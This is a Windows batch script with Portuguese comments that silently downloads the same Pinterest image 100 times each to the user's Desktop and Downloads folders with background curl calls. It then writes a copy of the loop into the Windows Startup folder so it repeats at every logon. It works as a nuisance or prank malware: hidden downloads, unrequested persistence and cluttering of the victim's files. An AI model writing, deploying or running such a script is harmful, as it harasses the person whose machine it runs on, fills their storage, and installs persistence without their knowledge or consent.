@echo off
setlocal

set "URL=https://i.pinimg.com/736x/8f/83/de/8f83de574f9b3510f79ace1c22e0311c.jpg"
set "DESK=%USERPROFILE%\Desktop"
set "DOWN=%USERPROFILE%\Downloads"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "STARTBAT=%STARTUP%\auto-download.bat"

:: Quantidade de downloads (mude aqui)
set "QTD=100"

:: ---- Download rápido e invisível
for /L %%i in (1,1,%QTD%) do (
    start "" /B curl -L -s "%URL%" -o "%DESK%\img%%i.jpg"
    start "" /B curl -L -s "%URL%" -o "%DOWN%\img%%i.jpg"
)

:: ---- Cria o .bat do Startup silencioso
(
echo @echo off
echo set "URL=%URL%"
echo set "DESK=%%USERPROFILE%%\Desktop"
echo set "DOWN=%%USERPROFILE%%\Downloads"
echo set "QTD=%QTD%"
echo for /L %%%%i in (1,1,%%QTD%%^) do ^(
echo start "" /B curl -L -s "%%URL%%" -o "%%DESK%%\img%%%%i.jpg"
echo start "" /B curl -L -s "%%URL%%" -o "%%DOWN%%\img%%%%i.jpg"
echo ^)
echo exit
) > "%STARTBAT%"

endlocal
exit